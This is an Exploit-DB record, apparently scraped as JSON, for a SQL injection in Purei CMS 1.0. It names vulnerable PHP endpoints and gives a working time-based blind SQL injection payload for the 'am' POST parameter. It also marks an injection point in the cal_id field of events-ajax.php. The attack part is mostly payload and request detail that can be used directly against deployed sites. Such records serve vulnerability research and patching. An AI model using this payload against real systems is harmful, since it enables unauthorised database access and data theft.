{"source": "https://www.exploit-db.com/exploits/51929", "vulnName": "Purei CMS 1.0 - SQL Injection", "vulnEDBID": "51929", "vulnCVE": "N/A", "author": "NUMBER 7", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-03-28", "vulnContent": "# Exploit Title: Purei CMS 1.0 - SQL Injection\n# Date: [27-03-2024]\n# Exploit Author: [Number 7]\n# Vendor Homepage: [purei.com]\n# Version: [1.0]\n# Tested on: [Linux]\n____________________________________________________________________________________\n\nIntroduction:\nAn SQL injection vulnerability permits attackers to modify backend SQL statements through manipulation \nof user input. Such an injection transpires when web applications accept user input directly inserted \ninto an SQL statement without effectively filtering out hazardous characters.\n\nThis could jeopardize the integrity of your database or reveal sensitive information.\n____________________________________________________________________________________\n\nTime-Based Blind SQL Injection:\nVulnerable files:\nhttp://localhost/includes/getAllParks.php\nhttp://localhost/includes/getSearchMap.php\n\nmake a POST request with the value of the am input set to :  \n\n if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'\"XOR(if(now()=sysdate(),sleep(9),0))OR\"*/ \n\nmake sure to url encode the inputs. \nSQL injection:\nMethod: POST REQUEST\n\nVunerable file:\n\n/includes/events-ajax.php?action=getMonth\ndata for the POST req:\nmonth=3&type=&year=2024&cal_id=1[Inject Here]\n            "}